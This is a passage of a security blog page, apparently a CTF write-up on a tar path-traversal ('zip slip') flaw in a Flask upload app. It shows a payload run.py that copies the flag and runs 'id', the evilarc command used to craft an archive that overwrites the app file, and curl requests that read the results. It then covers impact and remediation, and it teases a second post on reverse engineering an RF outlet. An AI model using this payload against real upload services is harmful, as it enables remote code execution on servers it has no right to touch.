+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_145a5a0556334d3e8c1f4c191fcf35e3-1"><code data-line-number="1"></code></a></td>
+<td class="code"><code><a id="rest_code_145a5a0556334d3e8c1f4c191fcf35e3-1" name="rest_code_145a5a0556334d3e8c1f4c191fcf35e3-1"></a><span class="kn">from</span> <span class="nn">application.main</span> <span class="kn">import</span> <span class="n">app</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_145a5a0556334d3e8c1f4c191fcf35e3-2"><code data-line-number="2"></code></a></td>
+<td class="code"><code><a id="rest_code_145a5a0556334d3e8c1f4c191fcf35e3-2" name="rest_code_145a5a0556334d3e8c1f4c191fcf35e3-2"></a><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">use_evalex</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</code></td>
+</tr>
+</table></div>
+<p>and the modified code:</p>
+<div class="code"><table class="codetable">
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-1"><code data-line-number=" 1"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-1" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-1"></a><span class="kn">from</span> <span class="nn">application.main</span> <span class="kn">import</span> <span class="n">app</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-2"><code data-line-number=" 2"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-2" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-2"></a><span class="kn">import</span> <span class="nn">shutil</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-3"><code data-line-number=" 3"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-3" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-3"></a><span class="kn">import</span> <span class="nn">os</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-4"><code data-line-number=" 4"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-4" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-4"></a><span class="k">try</span><span class="p">:</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-5"><code data-line-number=" 5"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-5" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-5"></a>    <span class="n">path</span> <span class="o">=</span> <span class="s1">'/app/application/static/'</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-6"><code data-line-number=" 6"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-6" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-6"></a>    <span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="s1">'flag'</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">'flag'</span><span class="p">))</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-7"><code data-line-number=" 7"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-7" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-7"></a>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-8"><code data-line-number=" 8"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-8" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-8"></a>    <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s1">'id'</span><span class="p">)</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-9"><code data-line-number=" 9"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-9" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-9"></a>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-10"><code data-line-number="10"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-10" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-10"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">'logfile.txt'</span><span class="p">),</span> <span class="s1">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-11"><code data-line-number="11"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-11" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-11"></a>        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-12"><code data-line-number="12"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-12" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-12"></a><span class="k">except</span><span class="p">:</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-13"><code data-line-number="13"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-13" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-13"></a>    <span class="k">pass</span>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-14"><code data-line-number="14"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-14" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-14"></a>
+</code></td>
+</tr>
+<tr>
+<td class="linenos linenodiv"><a href="posts/zip-slip-malicious-archives/#rest_code_fe79a9d912d74e0698616e2fbc6c71c4-15"><code data-line-number="15"></code></a></td>
+<td class="code"><code><a id="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-15" name="rest_code_fe79a9d912d74e0698616e2fbc6c71c4-15"></a><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">use_evalex</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</code></td>
+</tr>
+</table></div>
+<p>This simply copies the flag from it's location within the app folder to the static files that are served by flask.
+This could be modified to do the same thing for multiple files, or initiate a reverse shell.</p>
+</section><section id="the-exploit"><h2>The exploit</h2>
+<p>I found a tool that had already been created to craft the malicious archive.</p>
+<p><a class="reference external" href="https://github.com/ptoomey3/evilarc">https://github.com/ptoomey3/evilarc</a></p>
+<p>That script uses the same vulnerable library to craft the archive.
+This also appears to work on zip archives as well, but that's something for another time.</p>
+<p>Simply running the script <code class="docutils literal">python evilarc.py run.py <span class="pre">-f</span> evil.tar.gz <span class="pre">-o</span> unix <span class="pre">-p</span> /app</code> generates the archive.</p>
+<ul class="simple">
+<li><p><code class="docutils literal">evil.tar.gz</code> is the file that is created</p></li>
+<li><p><code class="docutils literal">run.py</code> is the modified file from earlier</p></li>
+<li><p><code class="docutils literal"><span class="pre">-p</span> /app</code> specifies the directory where <code class="docutils literal">run.py</code> will be overwritten after traversal</p></li>
+</ul>
+<p>Uploading the resulting file in a browser and then doing <code class="docutils literal">curl <span class="pre">http://localhost:1337/static/flag</span></code> outputs the flag.</p>
+<p>Further, <code class="docutils literal">curl <span class="pre">http://localhost:1337/static/logfile.txt</span></code> reveals this app is running as root
+<code class="docutils literal">'uid=0(root) gid=0(root) <span class="pre">groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span></code></p>
+</section><section id="impact"><h2>Impact</h2>
+<p>This is a pretty severe vulnerability as it allows full remote code execution.
+In this particular instance, the flask app is run as root, and directly runs the app.py file in debug mode.</p>
+</section><section id="remediation"><h2>Remediation</h2>
+<p>The most severe problem with this app is that the contents of the uploaded file are trusted implicitly.
+To fix this, the user-supplied archive should not be blindly extracted.
+There currently isn't a fixed version of the <code class="docutils literal">tarfile</code> module, so until that is fixed upstream, some crude checks might provide some protection.
+Ex: refusing to extract files that start with <code class="docutils literal">..</code>
+The flask app shouldn't be run with debug mode turned on in a production environment.
+The flask app also shouldn't be running as root.</p>
+<p>I'm not sure how applicable this is to real world websites, as this example relies on <code class="docutils literal">supervisord</code> detecting the overwritten <code class="docutils literal">/app/run.py</code> file and reloading.
+Having never deployed a flask app to production myself, my understanding is that something like gnuicorn would only do that if debug settings were explicitly enabled.
+<a class="reference external" href="https://docs.gunicorn.org/en/stable/settings.html#debugging">https://docs.gunicorn.org/en/stable/settings.html#debugging</a></p>
+</section><section id="closing"><h2>Closing</h2>
+<p>This was a really fun challenge (and writing this took much longer than getting the flag).
+It is really interesting that this bug still exists 20 years after first identified in tar.
+The spread of python based web apps due to the popularity of Django and flask has brought old vulnerabilities that previously required local file system access can now be leveraged to remotely execute code.</p>
+</section>
+</div>
+    </article><article class="h-entry post-text" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title"><a href="posts/reverse-engineering-a-20-remote-controlled-outlet/" class="u-url">Reverse Engineering a $20 remote controlled outlet</a></h1>
+        <div class="metadata">
+            <p class="byline author vcard"><span class="byline-name fn" itemprop="author">
+                Haicen
+            </span></p>
+            <p class="dateline">
+            <a href="posts/reverse-engineering-a-20-remote-controlled-outlet/" rel="bookmark">
+            <time class="published dt-published" datetime="2021-08-14T19:47:14-04:00" itemprop="datePublished" title="2021-08-14 19:47">2021-08-14 19:47</time></a>
+            </p>
+        </div>
+    </header><div class="p-summary entry-summary">
+    <section id="introduction"><h2>Introduction</h2>
+<p>A few years ago, I bought a remote controlled outlet from Walmart.
+I don't recall the exact price, but it was less than $20.
+It was pretty much purchased for the explicit reason of trying to understand how they worked.
+The end goal, is that I wanted to know if</p>
+<ol class="arabic simple">
+<li><p>I could decode/intercept the signals</p></li>
+<li><p>It was vulnerable to replay attacks</p></li>
+</ol>
+<section id="tools-used"><h3>Tools Used</h3>
+<ul class="simple">
+<li><p>RTL SDR</p></li>
+<li><p>Yardstick One</p></li>
+<li><p>Inspectrum</p></li>
+<li><p>GQRX</p></li>
+<li><p>rfcat</p></li>
+</ul>
+<p>This is going to be quite a long post, so I suggest getting a cup of coffee before continuing.
+At the end, I have included a youtube video showing the entire process.</p>
+<p class="more"><a href="posts/reverse-engineering-a-20-remote-controlled-outlet/">Read more…</a></p></section></section>
+</div>
+    </article>
+</div>
+
+        <nav class="postindexpager"><ul class="pager">
+<li class="next">
+                <a href="index-1.html" rel="next">Older posts</a>
+            </li>
+        </ul></nav><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML" integrity="sha384-3lJUsx1TJHt7BA4udB5KPnDrlkO8T6J6v/op7ui0BbCjvZ9WqV4Xm6DTP6kQ/iBH" crossorigin="anonymous"></script><script type="text/x-mathjax-config">
+        MathJax.Hub.Config({tex2jax: {inlineMath: [['$latex ','$'], ['\\(','\\)']]}});
+        </script>
+</div>
+        <!--End of body content-->
+
+        <footer id="footer">
+            Contents © 2023         <a href="mailto:haicenhack@protonmail.com">Haicen</a> 
+            
+        </footer>
+</div>
+</div>
+
+
+            <script src="assets/js/all-nocdn.js"></script><!-- fancy dates --><script>
+    moment.locale("en");
+    fancydates(0, "YYYY-MM-DD HH:mm");
+    </script><!-- end fancy dates --><script>
+    baguetteBox.run('div#content', {
+        ignoreClass: 'islink',
+        captions: function(element) {
+            return element.getElementsByTagName('img')[0].alt;
+    }});
+    </script>
+</body>
+</html>
